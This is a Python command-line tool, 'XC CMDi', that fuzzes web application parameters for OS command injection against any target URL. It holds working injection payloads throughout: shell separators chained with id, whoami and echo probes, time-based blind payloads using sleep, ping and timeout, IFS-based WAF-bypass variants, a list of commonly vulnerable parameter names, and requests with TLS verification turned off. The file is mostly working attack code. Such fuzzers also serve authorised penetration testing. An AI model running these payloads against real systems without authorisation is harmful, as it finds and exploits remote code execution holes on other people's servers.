#!/usr/bin/env python3
"""XC CMDi — Command Injection Fuzzer"""

import sys, ssl, re, time, argparse
from urllib.request import urlopen, Request
from urllib.error import HTTPError
from urllib.parse import urlparse, urlencode, parse_qs

R='\033[91m'; G='\033[92m'; Y='\033[93m'; B='\033[94m'; M='\033[95m'; C='\033[96m'; W='\033[97m'; DIM='\033[2m'; BOLD='\033[1m'; RST='\033[0m'

BANNER = f"""{R}
╔═╗╔╦╗╔╦╗╦
║   ║║║ ║║║
╚═╝╔╩╝═╩╝╩  {Y}→ RCE{RST}
{DIM}Command Injection Fuzzer — XC Hub{RST}
"""

# Command injection separators / operators
SEPARATORS = [';', '|', '||', '&&', '`', '$(',  '\n', '%0a', '%0d%0a', '&', '%26', '%3b']

# Inline commands to detect (id, whoami)
DETECT_CMDS = ['id', 'whoami', 'echo xctest123']

# Output signatures we look for in response
OUTPUT_SIGS = [
    r'uid=\d+',           # id output
    r'root|www-data|apache|nginx|nobody',  # common users
    r'xctest123',         # echo canary
    r'Windows IP',        # Windows ipconfig
    r'WINDOWS',
    r'/bin/bash',
    r'sh\-\d+',
]

# Time-based blind payloads
TIME_PAYLOADS = [
    ('; sleep 5',         5, 'Linux sleep'),
    ('| sleep 5',         5, 'Linux pipe sleep'),
    ('& sleep 5',         5, 'Linux bg sleep'),
    ('`sleep 5`',         5, 'Linux backtick'),
    ('$(sleep 5)',        5, 'Linux subshell'),
    ('%0asleep+5',        5, 'URL-encoded newline'),
    ('; ping -c 5 127.0.0.1', 5, 'Linux ping'),
    ('& timeout /t 5',   5, 'Windows timeout'),
    ('| timeout /t 5',   5, 'Windows pipe timeout'),
    ('& ping -n 5 127.0.0.1', 5, 'Windows ping'),
]

# WAF bypass encodings
BYPASS_VARIANTS = [
    ('{sep}{cmd}',    'raw'),
    ('{sep}{cmd}',    'url_encode_sep'),
    ('{sep}{cmd}',    'double_url_sep'),
    ('${IFS}{sep}${IFS}{cmd}', 'IFS substitution'),
    ('{sep}{c}${IFS}{m}{d}',   'IFS split cmd'),
]

# Common param names for command injection
COMMON_PARAMS = [
    'cmd', 'exec', 'command', 'execute', 'ping', 'query', 'jump',
    'code', 'reg', 'do', 'func', 'arg', 'option', 'load', 'process',
    'step', 'read', 'function', 'req', 'feature', 'exe', 'module',
    'payload', 'run', 'print', 'ip', 'host', 'target', 'dest',
    'debug', 'test', 'id', 'path', 'url', 'dir', 'shell',
]

def fetch(url, timeout=12):
    h = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)', 'Accept': '*/*'}
    req = Request(url, headers=h)
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        t0 = time.time()
        with urlopen(req, timeout=timeout, context=ctx) as r:
            body = r.read(512*1024).decode('utf-8', errors='ignore')
            return r.status, body, time.time() - t0
    except HTTPError as e:
        try: body = e.read(8192).decode('utf-8', errors='ignore')
        except: body = ''
        return e.code, body, 0
    except Exception:
        return None, '', 0

def post_fetch(url, data, timeout=12):
    h = {'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/x-www-form-urlencoded', 'Accept': '*/*'}
    body_bytes = urlencode(data).encode()
    req = Request(url, data=body_bytes, headers=h, method='POST')
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        t0 = time.time()
        with urlopen(req, timeout=timeout, context=ctx) as r:
            body = r.read(512*1024).decode('utf-8', errors='ignore')
            return r.status, body, time.time() - t0
    except HTTPError as e:
        try: body = e.read(8192).decode('utf-8', errors='ignore')
        except: body = ''
        return e.code, body, 0
    except Exception:
        return None, '', 0

def inject_param(base_url, param, payload):
    parsed = urlparse(base_url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    params[param] = [payload]
    new_query = urlencode(params, doseq=True)
    return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"

def check_output(body):
    for sig in OUTPUT_SIGS:
        m = re.search(sig, body, re.IGNORECASE)
        if m:
            return m.group(0)
    return None

def inline_test(base_url, param, method='GET'):
    print(f"\n  {C}[inline] param={W}{param}{RST}")
    findings = []
    for sep in SEPARATORS:
        for cmd in DETECT_CMDS:
            payload = sep + cmd
            if method == 'GET':
                url = inject_param(base_url, param, payload)
                status, body, elapsed = fetch(url)
            else:
                status, body, elapsed = post_fetch(base_url, {param: payload})
            out = check_output(body) if body else None
            if out:
                print(f"  {R}[VULN ★]{RST} sep={C}{repr(sep)}{RST} cmd={C}{cmd}{RST}")
                print(f"           output={Y}{out}{RST}")
                findings.append({'param': param, 'type': 'inline', 'payload': payload, 'output': out})
            time.sleep(0.12)
    return findings

def time_test(base_url, param, method='GET'):
    print(f"\n  {C}[time-based] param={W}{param}{RST}")
    findings = []
    # Get baseline
    if method == 'GET':
        _, _, baseline = fetch(inject_param(base_url, param, 'test'))
    else:
        _, _, baseline = post_fetch(base_url, {param: 'test'})

    for payload, expected, label in TIME_PAYLOADS:
        if method == 'GET':
            url = inject_param(base_url, param, payload)
            status, body, elapsed = fetch(url, timeout=expected + 8)
        else:
            status, body, elapsed = post_fetch(base_url, {param: payload}, timeout=expected + 8)
        delayed = elapsed >= (expected * 0.8) and elapsed > (baseline + expected * 0.5)
        color = R if delayed else DIM
        sym = '★' if delayed else '~'
        print(f"  {color}[{sym}]{RST} {label} — {elapsed:.2f}s (baseline {baseline:.2f}s)")
        if delayed:
            print(f"       {R}LIKELY VULN{RST} — payload={C}{payload}{RST}")
            findings.append({'param': param, 'type': 'time-based', 'payload': payload, 'elapsed': elapsed})
        time.sleep(0.3)
    return findings

def main():
    print(BANNER)
    parser = argparse.ArgumentParser(description='XC Command Injection Fuzzer')
    parser.add_argument('target', help='Target URL (e.g. https://site.com/ping?ip=127.0.0.1)')
    parser.add_argument('--params', help='Params to test (comma-separated)')
    parser.add_argument('--post', help='POST params to test (comma-separated)')
    parser.add_argument('--time', action='store_true', help='Time-based blind test (slow, ~10s/payload)')
    parser.add_argument('--full', action='store_true', help='Inline + time-based')
    args = parser.parse_args()

    target = args.target
    if not target.startswith('http'):
        target = 'https://' + target
    parsed = urlparse(target)
    url_params = list(parse_qs(parsed.query).keys())

    get_params = [p.strip() for p in args.params.split(',')] if args.params else (url_params or COMMON_PARAMS[:6])
    post_params = [p.strip() for p in args.post.split(',')] if args.post else []

    print(f"{BOLD}Target:{RST} {W}{target}{RST}")
    print(f"{BOLD}GET:{RST}    {W}{', '.join(get_params)}{RST}")
    if post_params:
        print(f"{BOLD}POST:{RST}   {W}{', '.join(post_params)}{RST}")

    all_findings = []

    print(f"\n{BOLD}{B}━━━ INLINE COMMAND INJECTION ━━━{RST}")
    for p in get_params:
        all_findings += inline_test(target, p, 'GET')
    for p in post_params:
        all_findings += inline_test(target, p, 'POST')

    if args.time or args.full:
        print(f"\n{BOLD}{B}━━━ TIME-BASED BLIND ━━━{RST}")
        for p in get_params:
            all_findings += time_test(target, p, 'GET')
        for p in post_params:
            all_findings += time_test(target, p, 'POST')

    print(f"\n{BOLD}━━━ SUMMARY ━━━{RST}")
    if all_findings:
        print(f"  {R}VULNERABLE! {len(all_findings)} finding(s){RST}")
        for f in all_findings:
            tag = R if f['type'] == 'inline' else Y
            out = f.get('output', f"~{f.get('elapsed',''):.1f}s delay" if 'elapsed' in f else '')
            print(f"  {tag}[{f['type']}]{RST} {W}{f['param']}{RST} → payload={C}{f['payload']}{RST}")
            if out: print(f"             output={Y}{out}{RST}")
    else:
        print(f"  {G}No command injection found{RST}")
        print(f"  {DIM}Try --time for blind detection, --post for form params{RST}")

    print(f"\n{DIM}Use --full for inline+time, --post param1,param2 for POST forms.{RST}\n")

if __name__ == '__main__':
    main()
